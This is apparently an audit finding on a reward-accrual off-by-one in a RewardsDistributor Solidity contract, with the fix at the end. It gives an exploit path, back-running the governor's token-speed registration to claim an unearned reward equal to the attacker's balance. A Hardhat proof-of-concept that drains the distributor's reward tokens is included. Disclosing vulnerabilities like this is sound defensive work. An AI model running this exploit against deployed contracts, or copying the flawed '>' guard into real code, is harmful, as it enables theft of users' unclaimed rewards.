### Title
Reward accrual off-by-one: accounts accrue `balance`-sized rewards when token index equals `INITIAL_INDEX` - (contracts/RewardsDistributor.sol)

### Summary
The bug class is a boundary/threshold off-by-one (`>`/`<=` instead of `>=`/`<`). In `RewardsDistributor._calculateTokenDelta`, the late-joiner fallback `if (_accountIndex == 0 && _tokenIndex > INITIAL_INDEX)` uses a strict `>` against `INITIAL_INDEX` (line 225). When the token index is still exactly `INITIAL_INDEX` (1e18), a first-time account keeps `_accountIndex == 0`, producing `_deltaIndex = 1e18` and `_tokensDelta = balance * 1` — an instant, unearned accrual equal to the account's full DepositToken/DebtToken balance.

### Finding Description
`tokenStates[token_]` is initialized to `TokenState({index: INITIAL_INDEX, timestamp: block.timestamp})` when a reward speed is first set (`_updateTokenSpeed`, line 298). `_updateTokenIndex`/`_calculateTokenIndex` only advance the index when `_deltaTimestamps > 0 && _speed > 0` (line 203); in the same block (or any window where the index has not yet moved), `tokenStates[token_].index == INITIAL_INDEX`.

`_calculateTokenDelta` (lines 217-231):
```solidity
if (_accountIndex == 0 && _tokenIndex > INITIAL_INDEX) {
    _accountIndex = INITIAL_INDEX;
}
uint256 _deltaIndex = _tokenIndex - _accountIndex;              // 1e18 - 0 = 1e18
_tokensDelta = token_.balanceOf(account_).wadMul(_deltaIndex);  // = balanceOf(account_)
```
Because the guard is `>` rather than `>=`, an account never before synced gets `_accountIndex = 0` and immediately accrues `balanceOf(account_)` reward units. The accrual path is reachable permissionlessly via `updateBeforeMintOrBurn(token_, account_)` (line 175, "may be called by anyone"), and the accrued amount is paid out via `claimRewards(accounts_, tokens_)` → `_transferRewardIfEnoughTokens` (line 251), which sends `tokensAccruedOf[account_]` in `rewardToken` if the contract balance covers it.

### Impact Explanation
Direct theft of the RewardsDistributor's reward-token balance (unclaimed yield belonging to all users). An attacker holding a large `DepositToken`/`DebtToken` balance triggers `updateBeforeMintOrBurn` in the same block the governor registers the token (index still `INITIAL_INDEX`, `_deltaTimestamps == 0`), receives `tokensAccruedOf[attacker] = balance`, then calls `claimRewards` and drains `min(accrued, rewardToken.balanceOf(distributor))`. The bigger the tracked-token balance, the bigger the theft.

### Likelihood Explanation
The window is real but narrow: the index sits at exactly `INITIAL_INDEX` only while `_deltaTimestamps == 0` (same block as `updateTokenSpeed`/`updateTokenSpeeds`/`syncTokenSpeed` registration) or while index was initialized but never advanced. Governor speed-setting transactions are public-mempool visible, so an attacker who pre-positions a large deposit balance and back-runs/bundles the governor's tx in the same block hits the boundary deterministically. No privileged role, oracle manipulation, or fake tokens are required.

### Recommendation
Change the boundary comparison so the fallback also applies at equality:
```solidity
if (_accountIndex == 0 && _tokenIndex >= INITIAL_INDEX) {
    _accountIndex = INITIAL_INDEX;
}
```
This mirrors the original report (`<=` vs `<` at a threshold boundary) and yields `_deltaIndex = 0` for first-sync accounts while the index is still at its initial value.

### Proof of Concept
Hardhat sketch (existing test harness in `test/`):

```ts
// setup: pool, depositToken (msdX), rewardsDistributor registered on pool, rewardToken = MET
// 1. attacker deposits collateral and holds a large depositToken balance
await underlying.mint(attacker.address, parseEther('1000000'));
await underlying.connect(attacker).approve(depositToken.address, ethers.constants.MaxUint256);
await depositToken.connect(attacker).deposit(parseEther('1000000'), attacker.address);

// 2. fund the distributor with reward tokens
await rewardToken.mint(rewardsDistributor.address, parseEther('500000'));

// 3. in the SAME BLOCK as governor registers the token speed, attacker syncs.
//    Use evm_setAutomine(false) or hardhat_mine so both txs share a timestamp.
await ethers.provider.send('evm_setAutomine', [false]);
const tx1 = await rewardsDistributor.connect(governor)
  .updateTokenSpeed(depositToken.address, parseEther('1')); // index = INITIAL_INDEX
const tx2 = await rewardsDistributor.connect(attacker)
  .updateBeforeMintOrBurn(depositToken.address, attacker.address);
await ethers.provider.send('evm_mine', []);
await ethers.provider.send('evm_setAutomine', [true]);

// 4. attacker accrued balanceOf(attacker) reward units despite never earning anything
const accrued = await rewardsDistributor.claimable(attacker.address);
expect(accrued).to.eq(await depositToken.balanceOf(attacker.address)); // ~1e6e18

// 5. claim drains the reward token balance
await rewardsDistributor.connect(attacker)
  ['claimRewards(address)'](attacker.address);
expect(await rewardToken.balanceOf(attacker.address)).to.be.gt(0); // up to 500000 MET
```

Alternatively, the same result is reachable later in any block where `tokenStates[token_].index` is still `INITIAL_INDEX` because `_speed == 0` or `_deltaTimestamps == 0` — the check `index > 0` in `claimRewards`/`updateBeforeMintOrBurn` (lines 156, 176) passes while the index has not yet moved.
